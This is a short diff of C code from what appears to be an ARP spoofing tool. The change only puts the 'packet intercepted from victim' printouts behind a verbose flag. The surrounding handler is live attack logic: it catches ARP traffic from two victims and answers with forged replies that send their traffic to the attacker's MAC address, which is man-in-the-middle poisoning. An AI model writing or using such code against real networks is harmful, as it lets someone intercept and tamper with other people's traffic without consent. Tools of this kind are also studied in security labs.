@@ -29,11 +29,13 @@ void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_c
 
 		//process packets that came from victims
 		if(maccmp(&arp->source,mac_victim1)==0&&(maccmp(&arp->target,mac_victim2)==0||maccmp(&arp->target,mac_attacker)==0||maccmp(&arp->target,mac_bcast)==0)){
-			printf("     ☠️  ☠️  ☠️   packet intercepted from victim 1  ☠️  ☠️  ☠️   \n");
+			if(verbose==1)
+                printf("     ☠️  ☠️  ☠️   packet intercepted from victim 1  ☠️  ☠️  ☠️   \n");
 			replyARP(mac_victim1,ip_victim1,ip_victim2,mac_attacker,(libnet_t*)args);
 		}
 		if(maccmp(&arp->source,mac_victim2)==0&&(maccmp(&arp->target,mac_victim1)==0||maccmp(&arp->target,mac_attacker)==0||maccmp(&arp->target,mac_bcast)==0)){
-			printf("     ☠️  ☠️  ☠️   packet intercepted from victim 2  ☠️  ☠️  ☠️   \n");
+            if(verbose==1)
+                printf("     ☠️  ☠️  ☠️   packet intercepted from victim 2  ☠️  ☠️  ☠️   \n");
 			replyARP(mac_victim2,ip_victim2,ip_victim1,mac_attacker,(libnet_t*)args);
 		}
 
